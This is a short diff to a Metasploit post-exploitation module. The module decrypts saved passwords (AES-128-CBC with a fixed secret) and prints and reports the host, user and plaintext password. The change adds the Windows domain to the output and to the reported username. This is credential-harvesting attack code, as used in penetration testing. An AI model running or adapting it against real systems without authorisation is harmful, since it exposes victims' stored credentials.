@@ -88,7 +88,8 @@ class Metasploit3 < Msf::Post
 			decoded = epassword.unpack("m*")[0]
 			iv= decoded.slice!(0,16)
 			pass=decrypt(decoded, @secret , iv, "AES-128-CBC")
-			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} USER: #{user} PASS: #{pass}")
+			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")
+			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
 			report_auth_info(
 							:host  => host,
 							:port => port,
